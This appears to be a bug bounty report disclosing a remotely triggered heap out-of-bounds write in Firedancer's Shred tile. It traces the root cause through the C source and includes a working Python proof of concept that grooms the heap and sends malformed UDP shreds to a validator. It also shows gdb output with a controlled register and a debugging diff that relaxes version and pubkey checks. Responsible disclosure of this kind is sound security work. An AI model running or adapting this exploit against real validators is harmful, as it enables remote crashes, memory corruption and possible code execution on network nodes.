# Boost \_ Firedancer v0.1 34272 - \[Blockchain\_DLT - Medium] Remote memory corruption in Shred tile

## Remote memory corruption in Shred tile

Submitted on Wed Aug 07 2024 22:54:16 GMT-0400 (Atlantic Standard Time) by @Swift77057 for [Boost | Firedancer v0.1](https://immunefi.com/bounty/firedancer-boost/)

Report ID: #34272

Report type: Blockchain/DLT

Report severity: Medium

Target: <https://github.com/firedancer-io/firedancer/tree/e60d9a6206efaceac65a5a2c3a9e387a79d1d096>

Impacts:

* Key compromise/exfiltration exploit chain
* Liveness issues that cause Firedancer v0.1 validators to crash or be unavailable
* Remote Code Execution (RCE)

### Description

## Remote memory corruption in Shred tile

### Overview

A memory corruption vulnerability exists in the Shred tile of Frankendancer and Firedancer. The vulnerability is a critical out-of-bounds write on the end of a heap allocation with fully attacker-controlled data and can be triggered by a UDP packet received from a fully remote attacker.

### Root Cause

The root cause is that the calculated footprint for fd\_bmtree is too small to contain Merkle trees of high depth. In particular, the footprint for `fd_bmtree_commit` is calculated as follows:

```
FD_FN_CONST ulong
fd_bmtree_commit_footprint( ulong inclusion_proof_layer_cnt ) {
  /* A complete binary tree with n layers has (2^n)-1 nodes.  We keep 1
     extra bmtree_node_t (included in sizeof(fd_bmtree_commit_t)) to
     avoid branches when appending commits. */
  return fd_ulong_align_up( sizeof(fd_bmtree_commit_t) +
    ( (1UL<<inclusion_proof_layer_cnt)-1UL       )*sizeof(fd_bmtree_node_t) +
    (((1UL<<inclusion_proof_layer_cnt)+63UL)/64UL)*sizeof(ulong),
    fd_bmtree_commit_align() );
}
```

Going deeper, the fd\_bmtree objects are allocated jointly by `fd_fec_resolver_new()` as follows:

```
  ulong footprint_per_bmtree = fd_bmtree_commit_footprint( INCLUSION_PROOF_LAYERS );

  FD_SCRATCH_ALLOC_INIT( l, shmem );
  void * self        = FD_SCRATCH_ALLOC_APPEND( l, FD_FEC_RESOLVER_ALIGN,  sizeof(fd_fec_resolver_t)                       );
  void * curr        = FD_SCRATCH_ALLOC_APPEND( l, ctx_map_align(),        ctx_map_footprint( lg_curr_map_cnt )            );
  void * done        = FD_SCRATCH_ALLOC_APPEND( l, ctx_map_align(),        ctx_map_footprint( lg_done_map_cnt )            );
  void * free        = FD_SCRATCH_ALLOC_APPEND( l, freelist_align(),       freelist_footprint( depth+partial_depth+1UL )   );
  void * cmplst      = FD_SCRATCH_ALLOC_APPEND( l, freelist_align(),       freelist_footprint( complete_depth+1UL  )       );
  void * bmfree      = FD_SCRATCH_ALLOC_APPEND( l, bmtrlist_align(),       bmtrlist_footprint( depth+1UL )                 );
  void * bmfootprint = FD_SCRATCH_ALLOC_APPEND( l, FD_BMTREE_COMMIT_ALIGN, depth*footprint_per_bmtree                      );
  FD_SCRATCH_ALLOC_FINI( l, FD_FEC_RESOLVER_ALIGN );
```

The parameter `INCLUSION_PROOF_LAYERS` is defined to 10 which means that each fd\_bmtree has the following layout:

* one `fd_bmtree_commit_t` header
* 1023 `fd_bmtree_node_t` nodes
* 16 `ulong` bitmap containing valid bits for each node

Now that we understand the layout of fd\_bmtree, let's analyze how it's being used by `fd_fec_resolver_add_shred()` which is the function that processes incoming shreds from the P2P UDP network. The fd\_bmtree objects are initialized lazily upon the first received packet (when the ctx lookup fails), and they are allocated from a linked list allocator ("freelist"). Here is that location:

```
  if( FD_UNLIKELY( !ctx ) ) {
    // redacted for simplicity

    void         * bmtree_mem = bmtrlist_pop_head( bmtree_free_list );

    /* Now we need to derive the root of the Merkle tree and verify the
       signature to prevent a DOS attack just by sending lots of invalid
       shreds. */
    fd_bmtree_commit_t * tree;
    tree = fd_bmtree_commit_init( bmtree_mem, FD_SHRED_MERKLE_NODE_SZ, FD_BMTREE_LONG_PREFIX_SZ, INCLUSION_PROOF_LAYERS );

    // redacted for simplicity
```

After the fd\_bmtree has been initialized and associated to a context, incoming shreds use `fd_bmtree_commitp_insert_with_proof()` to insert additional proof entries into the tree. Here is where the vulnerability lies. The `fd_bmtree_commitp_insert_with_proof()` takes two parameters: `tree_depth` (now called `proof_depth`) and `shred_idx`. The tree depth is calculated according to:

```
  ulong tree_depth           = fd_shred_merkle_cnt( variant ); /* In [0, 15] */
```

```
FD_FN_CONST static inline uint
fd_shred_merkle_cnt( uchar variant ) {
  uchar type = fd_shred_type( variant );
  if( FD_UNLIKELY( ( type == FD_SHRED_TYPE_LEGACY_DATA ) | ( type == FD_SHRED_TYPE_LEGACY_CODE ) ) )
    return 0;
  return (variant&0xfU);
}
```

Tracing deeper, the `tree_depth` is the lowest 4 bits of the `shred->variant` parameter that is attacker-controlled. As given by 4 bits it can take any value between 0 and 15. However the fd\_bmtree was only allocated to hold 1023 nodes. In the first for-loop inside `fd_bmtree_commitp_insert_with_proof()` we find the following snippet:

```
  ulong layer=0UL;
  for( ; layer<proof_depth; layer++ ) {
    ulong sibling_idx = inc_idx ^ (2UL<<layer);
    if( FD_UNLIKELY( HAS(sibling_idx) && !fd_memeq( proof+hash_sz*layer, state->inclusion_proofs[sibling_idx].hash, hash_sz ) ) )
      return 0;
    if( FD_UNLIKELY( HAS(inc_idx) && !fd_memeq( state->node_buf[layer].hash, state->inclusion_proofs[ inc_idx ].hash, hash_sz ) ) )
      return 0;

    ulong parent_idx = fd_ulong_insert_lsb( inc_idx, (int)layer+2, (2UL<<layer)-1UL );

    if( HAS(sibling_idx) & HAS(inc_idx) ) state->node_buf[ layer+1UL ] = state->inclusion_proofs[ parent_idx ];
    else {
      fd_bmtree_node_t sibling;
      fd_memcpy( sibling.hash, proof+hash_sz*layer, hash_sz );

      fd_bmtree_node_t * tmp_l = fd_ptr_if( 0UL==(inc_idx & (2UL<<layer)), state->node_buf+layer, &sibling );
      fd_bmtree_node_t * tmp_r = fd_ptr_if( 0UL==(inc_idx & (2UL<<layer)), &sibling, state->node_buf+layer );

      fd_bmtree_private_merge( state->node_buf+layer+1UL, tmp_l, tmp_r, state->hash_sz, state->prefix_sz );
    }

    inc_idx = parent_idx;
  }
```

The iterator `layer` will iterate through range of values `[0..proof_depth)`. The calculation of sibling\_idx is somewhat complicated, but to quicky illustrate the point it has a contributing term of `(2UL<<layer)` which maximally comes out to `(2 << 15) == 65536` in the final iteration. This is much greater than the 1023 entries the fd\_bmtree was designed to handle. This for loop will access `state->inclusion_proofs` out-of-bounds... but these access are only reads and does not yet lead to memory corruption. The HAS() macro also goes out-of-bounds at this point by the way.

After that, there's another for loop. I will spare the details here as they are not interesting... Unlike other loops in this function, this loop actually checks the index against inclusion\_proof\_sz and will eventually break due to that condition. Because of this condition, it will not go out-of-bounds.

```
  for( ; layer<63UL; layer++ ) {
    if( (inc_idx|(2UL<<layer)) >= inclusion_proof_sz    ) break; /* Sibling out of bounds => At root */
    if( HAS( inc_idx ) | !HAS( inc_idx ^ (2UL<<layer) ) ) break; /* Not able to derive any more */

    fd_bmtree_node_t * sibling = state->inclusion_proofs + (inc_idx ^ (2UL<<layer));
    fd_bmtree_node_t * tmp_l = fd_ptr_if( 0UL==(inc_idx & (2UL<<layer)), state->node_buf+layer, sibling );
    fd_bmtree_node_t * tmp_r = fd_ptr_if( 0UL==(inc_idx & (2UL<<layer)), sibling, state->node_buf+layer );
    fd_bmtree_private_merge( state->node_buf+layer+1UL, tmp_l, tmp_r, state->hash_sz, state->prefix_sz );

    inc_idx = fd_ulong_insert_lsb( inc_idx, (int)layer+2, (2UL<<layer)-1UL );
  }
```

Finally there are two for loops which copies the proofs into the tree. Here they are...

```
  /* Cache the nodes from the main branch */
  inc_idx = 2UL * idx;
  for( ulong i=0UL; i<=layer; i++ ) {
    state->inclusion_proofs[ inc_idx ] = state->node_buf[ i ];
    state->inclusion_proofs_valid[inc_idx/64UL] |= ipfset_ele( inc_idx%64UL );
    inc_idx = fd_ulong_insert_lsb( inc_idx, (int)i+2, (2UL<<i)-1UL );
  }

  /* Cache the inclusion proof */
  inc_idx = 2UL * idx;
  for( ulong i=0UL; i<proof_depth; i++ ) {
    ulong sibling_idx = inc_idx ^ (2UL<<i);
    fd_memcpy( state->inclusion_proofs[ sibling_idx ].hash, proof+hash_sz*i, hash_sz ); [a]
    state->inclusion_proofs_valid[sibling_idx/64UL] |= ipfset_ele( sibling_idx%64UL );
    inc_idx = fd_ulong_insert_lsb( inc_idx, (int)i+2, (2UL<<i)-1UL );
  }
```

The last loop causes an out-of-bounds write at point \[a] where the `memcpy()` copies the i:th proof to `state->inclusion_proofs[ sibling_idx ].hash`. Once again, `sibling_idx` is too large because of the contributing term `(2UL<<i)` which is maximally `(2<<15)`, whereas the `inclusion_proofs` array only holds 1023 entries.

The heap and freelist can be groomed in various ways by sending network packets.

### Impact

The impact is a critical remotely triggered memory corruption in the Shred tile, which can lead to remote code execution in the Shred tile. The out-of-bounds data is fully controlled by the remote attacker, while the offset can be partially influenced but has constaints. The predictable memory layout as a result of the combined heap allocation helps make memory layout easier and more reliable, and an exploit developer might be able to use that to their advantage.

The P2P UDP packets have an Ed25519 signature, but the corruption is triggered *prior* to signature verification so the corruption is within reach even by attackers that don't have a high stake in the network and a correct signature is not required to exploit the vulnerability.

### Proof of concept

### Proof-of-concept

We have tested and confirmed the vulnerability at Git commit hash as specified in the Bounty program: e60d9a6206efaceac65a5a2c3a9e387a79d1d096

Attached to this report is a proof-of-concept Python script which constructs the necessary UDP payloads to trigger the vulnerability:

```
import socket
import struct
import ed25519
import hashlib
import os


# IP address and port
UDP_IP = "192.168.178.25"
UDP_PORT = 8003

print('[!] Connecting...')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

PAYLOAD_LEN = 1225 - 0x58

# craft shred
class FDShred:
    def __init__(self, idx, depth, payload):
        assert len(payload) == PAYLOAD_LEN
        self.signature = b'\xAA'*64
        self.slot = 0
        self.idx = idx
        self.fec_set_idx = 0
        self.variant = 0x90 | depth  # FD_SHRED_TYPE_MERKLE_DATA_CHAINED | depth
        self.data_flags = 0
        self.data_parent_off = 0
        self.data_size = 0x58
        self.version = 0
        self.payload = payload

    def pack(self):
        packed_data = self.signature
        packed_data += struct.pack("<B", self.variant)
        packed_data += struct.pack("<Q", self.slot)
        packed_data += struct.pack("<I", self.idx)
        packed_data += struct.pack("<H", self.version)
        packed_data += struct.pack("<I", self.fec_set_idx)
        
        packed_data += struct.pack("<H", self.data_parent_off)
        packed_data += struct.pack("<B", self.data_flags)
        packed_data += struct.pack("<H", self.data_size)

        assert len(packed_data) == 0x58
        return packed_data + self.payload
    
    def send(self):
        sock.sendto(self.pack(), (UDP_IP, UDP_PORT))

def hash_shred(buf):
    m = hashlib.sha256()
    m.update(b'\x00SOLANA_MERKLE_SHREDS_LEAF')
    m.update(buf[0x40:0x40+1139])
    hash = m.digest()
    assert len(hash) == 32
    return hash

sk = ed25519.SigningKey(b'\x00' * 32)
vk = sk.get_verifying_key()
print('[*] Pubkey:', vk.to_bytes().hex())

while 1:
    # Step 1. Groom things to be mostly zeroes.
    print('[+] Feng shui')
    for i in range(10000):
        payload = os.urandom(16) + (b'\x00'*(PAYLOAD_LEN-16))
        shred = FDShred(idx=0, depth=0, payload=payload)
        shred.signature = sk.sign(hash_shred(shred.pack()))
        shred.send()

        shred = FDShred(idx=i%68, depth=9, payload=b'\x00'*PAYLOAD_LEN)
        shred.send()


    # Step 2. Cause corruption.
    print('[+] Corrupt')
    for i in range(10000):
        payload = os.urandom(16) + (b'\x00'*(PAYLOAD_LEN-16))
        shred = FDShred(idx=0, depth=0, payload=payload)
        shred.signature = sk.sign(hash_shred(shred.pack()))
        shred.send()

        shred = FDShred(idx=0, depth=15, payload=b'\x41'*PAYLOAD_LEN)
        shred.send()
```

It crashes with the following register output:

```
(gdb) info reg
rax            0x85                133
rbx            0x3                 3
rcx            0x38c181190b00      62403745745664
rdx            0x162               354
rsi            0x0                 0
rdi            0x454c5f5344455248  4993470898079355464
rbp            0x5ddc001fd1f0      0x5ddc001fd1f0
rsp            0x5ddc001fd0e0      0x5ddc001fd0e0
r8             0x0                 0
r9             0x4e7d05b5fe00      86298873691648
r10            0x0                 0
r11            0x1d420             119840
r12            0x3f7               1015
r13            0xbe5               3045
r14            0x4e7d05b5fe00      86298873691648
r15            0x4141414141414141  4702111234474983745
rip            0x5a3395b576fe      0x5a3395b576fe <fd_shredder_next_fec_set+414>
eflags         0x10293             [ CF AF SF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
--Type <RET> for more, q to quit, c to continue without paging--
gs             0x0                 0
(gdb) 
(gdb) bt
#0  fd_shredder_next_fec_set (shredder=0x4e7d05b5fe00, result=result@entry=0x4e7d05b83520)
    at src/disco/shred/../../ballet/shred/fd_shred.h:256
#1  0x00005a33929189c2 in during_frag (_ctx=0x4e7d00001000, in_idx=<optimized out>, seq=<optimized out>, sig=<optimized out>, 
    chunk=<optimized out>, sz=<optimized out>, opt_filter=0x5ddc001fd6f4) at src/app/fdctl/run/tiles/fd_shred.c:409
#2  0x00005a3395b71a0c in fd_mux_tile (cnc=0x7e1383c09100, flags=<optimized out>, in_cnt=in_cnt@entry=4, 
    in_mcache=in_mcache@entry=0x5ddc001fee80, in_fseq=in_fseq@entry=0x5ddc001fea80, mcache=0x38c180001100, out_cnt=1, 
    _out_fseq=0x5ddc001ff680, burst=4, cr_max=16384, lazy=<optimized out>, rng=0x5ddc001fe5f0, scratch=0x5ddc001fe380, 
    ctx=0x4e7d00001000, callbacks=0x5ddc001fe5a0) at src/disco/mux/fd_mux.c:645
#3  0x00005a3395b647cb in fd_topo_run_tile (topo=0x5a33972bb3d8 <config+568>, tile=0x5a33973598d8 <config+649016>, 
    sandbox=<optimized out>, uid=<optimized out>, gid=<optimized out>, allow_fd=<optimized out>, wait=<optimized out>, 
    debugger=<optimized out>, tile_run=<optimized out>) at src/disco/topo/fd_topo_run.c:171
#4  0x00005a33928f5016 in tile_main (_args=0x7ffe1fc7acc0) at src/app/fdctl/run/run1.c:53
#5  0x000072bc2cb25a04 in ?? ()
#6  0x0000000000000000 in ?? ()
```

As can be seen above in the register dump, r15 has been completely controlled as a result of the memory corruption (0x4141414141414141).

To make the proof-of-concept more concise, the following diff was applied to Frankendancer. Note that none of the changes are required to trigger the vulnerability, they are just there to feng shui the bmtree freelist to get it to a state where it can clearly showcase the vulnerability:

```
diff --git a/src/app/fdctl/run/tiles/fd_shred.c b/src/app/fdctl/run/tiles/fd_shred.c
index 193a4b3d..169982b0 100644
--- a/src/app/fdctl/run/tiles/fd_shred.c
+++ b/src/app/fdctl/run/tiles/fd_shred.c
@@ -102,6 +102,8 @@ FD_STATIC_ASSERT( sizeof(fd_entry_batch_meta_t)==24UL, poh_shred_mtu );
 
 #define FD_SHRED_ADD_SHRED_EXTRA_RETVAL_CNT 2
 
+void *_fec_sets_;
+
 typedef struct {
   fd_shredder_t      * shredder;
   fd_fec_resolver_t  * resolver;
@@ -731,6 +733,7 @@ unprivileged_init( fd_topo_t *      topo,
   void * _shredder = FD_SCRATCH_ALLOC_APPEND( l, fd_shredder_align(),              fd_shredder_footprint()            );
   void * _fec_sets = FD_SCRATCH_ALLOC_APPEND( l, alignof(fd_fec_set_t),            sizeof(fd_fec_set_t)*fec_set_cnt   );
 
+  _fec_sets_ = _fec_sets;
   fd_fec_set_t * fec_sets = (fd_fec_set_t *)_fec_sets;
   fd_shred34_t * shred34  = (fd_shred34_t *)store_out_dcache;
 
diff --git a/src/ballet/bmtree/fd_bmtree.c b/src/ballet/bmtree/fd_bmtree.c
index 1a202742..00c8a10a 100644
--- a/src/ballet/bmtree/fd_bmtree.c
+++ b/src/ballet/bmtree/fd_bmtree.c
@@ -449,6 +449,14 @@ fd_bmtree_commitp_insert_with_proof( fd_bmtree_commit_t *     state,
   for( ulong i=0UL; i<proof_depth; i++ ) {
     ulong sibling_idx = inc_idx ^ (2UL<<i);
     fd_memcpy( state->inclusion_proofs[ sibling_idx ].hash, proof+hash_sz*i, hash_sz );
+
+    // debug print to indicate whether we are writing into the fec_set allocations
+    void *dst = (void*) state->inclusion_proofs[ sibling_idx ].hash;
+    extern void *_fec_sets_;
+    if (dst > _fec_sets_) {
+      FD_LOG_WARNING(("write to fecs!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"));
+    }
+
     state->inclusion_proofs_valid[sibling_idx/64UL] |= ipfset_ele( sibling_idx%64UL );
     inc_idx = fd_ulong_insert_lsb( inc_idx, (int)i+2, (2UL<<i)-1UL );
   }
diff --git a/src/disco/shred/fd_fec_resolver.c b/src/disco/shred/fd_fec_resolver.c
index b2b9b55b..8f3b356c 100644
--- a/src/disco/shred/fd_fec_resolver.c
+++ b/src/disco/shred/fd_fec_resolver.c
@@ -351,7 +351,8 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
     return FD_FEC_RESOLVER_SHRED_REJECTED;
   }
 
-  if( FD_UNLIKELY( shred->version!=resolver->expected_shred_version ) ) return FD_FEC_RESOLVER_SHRED_REJECTED;
+  // Skip the version check to make it easier to simulate network packets.
+  //if( FD_UNLIKELY( shred->version!=resolver->expected_shred_version ) ) return FD_FEC_RESOLVER_SHRED_REJECTED;
 
   int is_data_shred = fd_shred_is_data( shred_type );
 
@@ -426,6 +427,9 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
 
     fd_bmtree_node_t _root[1];
     fd_shred_merkle_t const * proof = fd_shred_merkle_nodes( shred );
+
+    FD_LOG_WARNING(("tree: %p", (void*)tree));
+
     int rv = fd_bmtree_commitp_insert_with_proof( tree, shred_idx, leaf, (uchar const *)proof, tree_depth, _root );
     if( FD_UNLIKELY( !rv ) ) {
       freelist_push_head( free_list,        set_to_use );
@@ -434,6 +438,13 @@ int fd_fec_resolver_add_shred( fd_fec_resolver_t    * resolver,
       return FD_FEC_RESOLVER_SHRED_REJECTED;
     }
 
+    // Override the leader pubkey to make it easier to simulate network packets.
+    (void) leader_pubkey;
+    const uchar leader_pubkey[] = {
+      0x3b, 0x6a, 0x27, 0xbc, 0xce, 0xb6, 0xa4, 0x2d, 0x62, 0xa3, 0xa8, 0xd0, 0x2a, 0x6f, 0x0d, 0x73,
+      0x65, 0x32, 0x15, 0x77, 0x1d, 0xe2, 0x43, 0xa6, 0x3a, 0xc0, 0x48, 0xa1, 0x8b, 0x59, 0xda, 0x29
+    };
+
     if( FD_UNLIKELY( FD_ED25519_SUCCESS != fd_ed25519_verify( _root->hash, 32UL, shred->signature, leader_pubkey, sha512 ) ) ) {
       freelist_push_head( free_list,        set_to_use );
       bmtrlist_push_head( bmtree_free_list, bmtree_mem );
```
